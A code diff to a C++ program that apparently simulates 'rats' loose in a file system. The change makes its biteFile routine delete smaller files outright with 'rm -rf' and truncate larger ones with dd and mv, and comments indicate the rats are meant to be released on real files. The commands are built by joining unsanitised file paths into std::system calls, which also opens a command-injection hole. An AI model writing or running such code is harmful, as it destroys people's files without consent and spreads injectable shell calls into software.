@@ -429,10 +429,22 @@ private:
     void biteFile(std::string Path){
         //TODO bite files
         //don't do this for a while
-        std::string command = "dd if="+Path+" of="+Path+"tmp bs=1 skip=10 conv=notrunc";
-        std::system(command.c_str());
-        command="mv "+Path+"tmp "+Path;
-        std::system(command.c_str());
+        std::filesystem::path filePath = Path;
+        int fileSize = std::filesystem::file_size(filePath);
+
+        fileSize/=2;
+
+        if(fileSize<2000){
+            std::string command;
+            command = "rm -rf "+Path;
+            std::system(command.c_str());
+        }else{
+            std::string command = "dd if="+Path+" of="+Path+"tmp bs=1 skip="+std::to_string(fileSize)+" conv=notrunc";
+            std::system(command.c_str());
+            command="mv "+Path+"tmp "+Path;
+            std::system(command.c_str());
+        }
+
     }
     void goNest(ratInfo& rat){
         //TODO add nest finding behavior //done probably!
@@ -698,7 +710,7 @@ private:
             //TODO uncomment when rats are loose
             return false;
         }
-        if(fileSize<200){
+        if(fileSize<2000){
             return false;
         }
 
